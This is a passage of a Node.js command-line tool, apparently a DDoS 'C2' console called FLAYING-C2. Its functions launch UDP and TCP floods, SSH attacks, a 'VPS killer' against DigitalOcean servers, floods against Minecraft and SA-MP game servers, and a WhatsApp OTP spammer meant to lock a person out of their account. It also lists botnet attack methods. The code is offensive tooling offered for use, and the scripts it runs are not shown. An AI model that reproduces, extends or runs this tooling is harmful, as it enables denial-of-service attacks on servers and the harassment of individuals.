exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀
             OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
            VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : FLAYINGSORYOU`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp <target> <port> <duration>
udp 123.456.78.910 53 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
            Udp Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : udp
Creator  : FLAYINGSORYOU`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: tcp <target> <port> <duration>
tcp 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
            Tcp Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : tcp
Creator  : FLAYINGSORYOU`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/tcp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
           Minecraft Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : FLAYINGSORYOU`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
            SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : FLAYINGSORYOU`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
               Subdomains Finder
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31mFLAYINGSORYOU Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By FLAYINGSORYOU

Thx To:
ChatGPT ( Fixing Error )
FLAYINGSORYOUNOTSEPUH ( Gatau Ngapain )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question(`${back_putih}${teksmerah}FLAYING-C2${Reset}➔ ${back_putih}${teksmerah}CONSOLE${Reset}: \n`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'Menu') {
    console.log(`
▬▭▬▭▬▭▬▭▬▭▬▭▬
COMMAND MENU
- /Methods
- /udp bakal l4
- /Botnetsrv
- /C
- /news
- /Monitor
▬▭▬▭▬▭▬▭▬▭▬▭▬
`);
    sigma();
  } else if (command === 'Methods') {
    console.log(`
───────────────────────[ATTACK METHODS]───────────────────────
 ► VIP
     - CIKO            - GLORY
     - RAW            - COOKIE 
     - MAKLO         - CLASIC     
     - ZXM            - XIN
     - VYN            - XVN 
     - CYN
     - XYN
     - KIKAZ 
     - TLS
 ► Bypass & Flood
     - STRIKE           - FLOOD
     - BYPASS          - KILL
     - MIXMAX         - FLAYINGRAW
     - RANDOM
     - BOTI 
     - HYPER
────────────────────────────────────────────────────────────
`);
    sigma();
          } else if (command === 'Botnetsrv') {
    console.log(`
──────────────────────[BOTNET OPERATIONS]──────────────────────
   • Srvattack   - Launch Attack with Server
───────────────────────[BOTNET METHODS]───────────────────────
 ► VIP
     - HTTPS
     - VIP
     - SORYOU
     - SIGMA
 ► Bypass & Flood
     - FLOOD
     - BYPASS
────────────────────────────────────────────────────────────
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'Attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp') {
    udp_flood(args);
  } else if (command === 'tcp') {
    tcp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'Monitor') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`FLAYINGSORYOU Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'Botnet') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'C') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()